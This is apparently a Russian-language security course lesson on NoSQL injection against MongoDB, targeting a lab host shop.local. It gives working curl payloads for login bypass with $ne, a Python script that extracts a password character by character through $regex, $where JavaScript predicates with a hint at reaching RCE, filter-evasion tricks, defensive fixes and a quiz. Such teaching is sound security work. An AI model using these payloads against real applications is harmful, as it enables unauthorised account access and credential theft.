---
id: web-nosql-injection
title: "NoSQL-инъекции: MongoDB, операторы, JS-движки"
category: web
parent: web-nosql-ldap-xpath
difficulty: medium
order: 1
tags: [nosql, mongodb, injection, auth, json]
prerequisites: [web-nosql-ldap-xpath]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "NoSQL-инъекции в MongoDB: операторная инъекция ($ne/$gt/$regex), $where/JS, обход логина и извлечение данных."
---

## Задача

Мы нашли в `shop.local` форму входа, которая общается с сервером через JSON, и сервер явно использует MongoDB. Хотим без пароля войти администратором, а если не выйдет — вытянуть пароль посимвольно. В прошлом уроке мы увидели, что `{"$ne":"x"}` сработал; теперь разберём **почему** и какие ещё операторы есть в запасе.

## Данные, с которыми работаем

Запрос на вход:

```http
POST /api/login HTTP/1.1
Host: shop.local
Content-Type: application/json

{"username":"admin","password":"secret"}
```

Серверный код (Node.js + Express + драйвер MongoDB):

```js
app.post('/api/login', async (req, res) => {
  const user = await db.collection('users').findOne({
    username: req.body.username,
    password: req.body.password
  });
  if (!user) return res.json({ error: 'invalid credentials' });
  res.json({ ok: true, token: makeToken(user) });
});
```

`findOne` принимает **фильтр** — JSON-документ вида `{поле: значение}`. Проблема в том, что `req.body.password` берётся из пользовательского JSON и **тип не проверяется**. Значением фильтра может оказаться не строка, а объект — и MongoDB воспримет его как **оператор**.

## Пробуем в лоб

Первое, что приходит в голову с прошлого урока про SQLi, — кавычка и `OR 1=1`:

```bash
$ curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' \
>   -d "{\"username\":\"admin\",\"password\":\"' OR 1=1-- -\"}"
{"error":"invalid credentials"}
```

Не работает: здесь нет SQL-парсера, `' OR 1=1` — просто текст, которого нет ни у одного пароля. Нужен синтаксис **самого MongoDB**.

## Приём: подставляем объект-оператор

В MongoDB `$`-ключи — это операторы сравнения. `$ne` — «не равно» (`not equal`). Пришлём пароль объектом:

```bash
$ curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' \
>   -d '{"username":"admin","password":{"$ne":"x"}}'
{"ok":true,"token":"eyJhbGciOiJIUzI1NiJ9..."}
```

Сервер построил фильтр «пароль не равен `x`». Для реального пароля это истина, поэтому нашёлся документ `admin` — и мы вошли. Обрати внимание: нам **не нужен** правильный пароль, достаточно, чтобы условие оказалось истинным.

Другие операторы того же семейства:

| Оператор | Смысл | Payload |
|----------|-------|---------|
| `$ne` | не равно | `{"$ne":"x"}` |
| `$gt` | больше | `{"$gt":""}` |
| `$regex` | регулярное выражение | `{"$regex":"^a"}` |
| `$in` | входит в список | `{"$in":["admin","root"]}` |
| `$exists` | поле существует | `{"$exists":true}` |
| `$where` | JS-предикат (опасно) | `"this.x==1"` |

## Формы доставки: не только JSON

Если форма обычная, а не JSON, скобочная нотация в теле создаёт вложенный объект:

```bash
$ curl -s -X POST https://shop.local/api/login \
>   --data-urlencode 'username=admin' --data-urlencode 'password[$ne]=x'
{"ok":true,"token":"eyJ..."}
```

`password[$ne]=x` парсер (`qs` в Express, PHP-массивы) превращает в `password: {$ne: "x"}`. То же в query-строке: `?username=admin&password[$ne]=x`. Проверяй все точки входа — тело, query, заголовки, аргументы GraphQL.

## Полный прогон: слепое извлечение пароля через `$regex`

Обход входа — это доступ, но часто хочется узнать сам пароль (или токен). Если сервер отвечает по-разному на «верно/неверно», используем `$regex` как оракул.

Сначала убедимся, что ответы различаются:

```bash
$ curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' \
>   -d '{"username":"admin","password":"wrong"}'
{"error":"invalid credentials"}

$ curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' \
>   -d '{"username":"admin","password":{"$regex":"^zzz"}}'
{"error":"invalid credentials"}

$ curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' \
>   -d '{"username":"admin","password":{"$regex":"^f"}}'
{"ok":true,"token":"eyJ..."}
```

`^f` значит «пароль начинается на `f`» — и это верно. Теперь перебираем символ за символом:

```python
import requests, string
URL = "https://shop.local/api/login"
CHARS = string.ascii_letters + string.digits + "_-{}!@#"
def match(prefix):
    r = requests.post(URL, json={"username":"admin","password":{"$regex":"^"+prefix}})
    return '"ok":true' in r.text
pw = ""
while True:
    for c in CHARS:
        if match(pw + c):
            pw += c; print(pw); break
    else:
        break
print("password =", pw)
```

Вывод по шагам:

```
f
fl
fla
flag
flag{...
```

Цикл идёт, пока находится следующий символ; когда ни один не подошёл — строка кончилась. Для ускорения вместо полного перебора символов берут **бинарный поиск** по диапазонам: проверяют класс `^flag\{[a-m]` и за один запрос отбрасывают половину алфавита.

## Ветка `$where`: JavaScript на сервере

Оператор `$where` принимает **JavaScript-предикат**, который исполняется на сервере базы. Это открывает тайминг-канал (можно спрашивать не только про префикс, но и про любые свойства документа) и в старых/неправильно настроенных инсталляциях — выход из песочницы:

```json
{"$where":"this.username=='admin' && this.password[0]=='a'"}
```

Через `constructor.constructor` в некоторых версиях добираются до `process` и до RCE, но это зависит от версии и от того, включён ли серверный JS (`--noscripting` его выключает). На реальном тесте `$where` чаще полезен как оракул, чем как RCE, — и осторожно: тяжёлый JS может уронить базу.

## Другие хранилища

Тот же принцип «ввод меняет структуру запроса» работает и за пределами MongoDB:

- **CouchDB** — Mango-селекторы и админ-интерфейс `_config`/`_users` (при «admin party» — доступ без пароля).
- **Elasticsearch** — скрипты `painless` в `_search`, при включённом скриптинге вплоть до RCE.
- **Neo4j** — инъекция в Cypher при конкатенации строк.

Поэтому SQL-сканеры их и не находят: синтаксис другой. Разбор этих хранилищ — в следующих уроках (`db-mongodb`, `db-redis`, `db-elasticsearch`).

## Почему это работает не только в Node.js

MongoDB-драйверы на любом языке принимают фильтр как словарь/ассоциативный массив. Если код кладёт туда значение из запроса без проверки типа, пришедший массив превращается в объект-оператор. Пример на PHP:

```php
$user = $collection->findOne([
  'username' => $_POST['username'],   // если пришёл массив — станет оператором
  'password' => $_POST['password'],
]);
```

Запрос `username[$ne]=x&password[$ne]=x` даст `['$ne' => 'x']` в оба поля — вход без пароля. В Python (pymongo) то же самое: `db.users.find_one({"username": request.json["username"]})`, где `username` — словарь `{"$ne": None}`. Лечится это одной строкой: `if (!is_string($username)) reject;`. Поэтому всегда проверяй, приводит ли сервер тип, прежде чем отбрасывать NoSQL-инъекцию.

## Если не сработало

- **Сервер приводит тип** (`typeof === 'string'`) — объект отбрасывается, вектор закрыт для этого параметра; ищи другие точки (числовые поля, `$in`-фильтры, GraphQL).
- **Фильтруются `$`-ключи** — попробуй URL-кодирование `%24ne` или unicode `\u0024ne`.
- **WAF по сигнатуре `$ne`** — смени оператор на `$gt`, `$gte`, `$nin`.
- **Включён `--noscripting`** — `$where`/`$function` не работают, остаются `$regex`/`$ne`/`$gt`.

## Что мы теперь знаем

- NoSQL-инъекция — это подстановка **оператора/структуры** вместо значения, когда сервер не проверяет тип ввода.
- `{"$ne":"x"}` даёт обход входа: условие истинно для любого пароля.
- Оператор можно доставить через JSON, form-urlencoded (`password[$ne]=x`) или query.
- `$regex` с `^prefix` — оракул для посимвольного извлечения (blind).
- `$where` исполняет JS на сервере БД: тайминг-канал и, иногда, RCE.
- Защита: строгая типизация входа, запрет `$`-ключей, отключение серверного скриптинга.

## Квиз

Проверь себя.

```quiz
- question: "Как обойти MongoDB-логин через оператор?"
  options:
    - "`password: ' OR 1=1-- -`"
    - '`password: {"$ne":"x"}`'
    - "`password: null`"
    - "`password: 123`"
  answer: 1
  explanation: "Объект-оператор `$ne` меняет логику `findOne`."
- question: "Какой оператор используют для посимвольного извлечения?"
  options:
    - "`LIKE`"
    - "`$regex`"
    - "`MATCH`"
    - "`=`"
  answer: 1
  explanation: "Регулярка `^prefix` даёт бинарный ответ верно/неверно."
- question: "Как передать оператор в form-urlencoded?"
  options:
    - "`password=$ne`"
    - "`password[$ne]=x`"
    - "`password.ne=x`"
    - "`password:ne`"
  answer: 1
  explanation: "Скобочная нотация создаёт вложенный объект."
- question: "Что опасно в `$where`?"
  options:
    - "Он медленный"
    - "Исполняет JavaScript на сервере БД — тайминг-канал и возможный RCE"
    - "Он шифрует данные"
    - "Он кеширует ответы"
  answer: 1
  explanation: "JS-контекст расширяет возможности за пределы сравнения строк."
- question: "Почему SQL-сканеры не находят NoSQL-инъекции?"
  options:
    - "Они медленные"
    - "Другой синтаксис и модель запросов"
    - "Нет TLS"
    - "Нет ошибок"
  answer: 1
  explanation: "Операторы MongoDB не совпадают с SQL-сигнатурами."
```

## Куда дальше

Мы научились обходить MongoDB-логин и тянуть данные через `$regex`. В следующем уроке `web-nosql-dbms` мы построим карту: как по баннеру и отклику отличить MongoDB от Redis, Elasticsearch и CouchDB — и почему у каждого хранилища свой, иногда куда более прямой путь до RCE. А пока главное запомни: если сервер не проверяет тип ввода, объект с `$`-оператором становится частью запроса.

## Где пригодится

- **CTF (Web):** задачи с JSON-логином и поиском — обход через `$ne`/`$regex` встречается постоянно.
- **Bug bounty:** обход аутентификации через тип-конфузию — критичный отчёт.
- **Пентест:** аудит приложений на MongoDB/CouchDB/Elasticsearch.
- **Работа (AppSec):** типизация входа, запрет операторов в пользовательских данных, отключение `$where`.
